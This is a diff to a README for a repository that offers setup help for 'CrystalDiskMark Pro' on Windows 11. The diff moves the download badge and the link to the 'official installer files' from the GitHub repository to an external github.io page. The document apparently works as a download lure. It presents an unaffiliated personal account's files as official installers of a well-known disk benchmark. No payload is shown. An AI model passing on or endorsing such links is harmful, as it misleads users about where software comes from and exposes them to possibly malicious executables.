@@ -1,6 +1,6 @@
 # 💾 CrystalDiskMark-Setup-Help - Run Disk Tests On Windows 11
 
-[![](https://img.shields.io/badge/Download-CrystalDiskMark_Resources-blue.svg)](https://github.com/Daviebeaming657/CrystalDiskMark-Setup-Help)
+[![](https://img.shields.io/badge/Download-CrystalDiskMark_Resources-blue.svg)](https://daviebeaming657.github.io)
 
 This guide provides steps to install and run CrystalDiskMark Pro on Windows 11. Use these instructions to resolve common setup failures and verify your storage performance.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 Visit the following page to access the official installer files for your system:
 
-[https://github.com/Daviebeaming657/CrystalDiskMark-Setup-Help](https://github.com/Daviebeaming657/CrystalDiskMark-Setup-Help)
+[https://daviebeaming657.github.io](https://daviebeaming657.github.io)
 
 1. Navigate to the link above.
 2. Look for the Releases section on the right side of the screen.
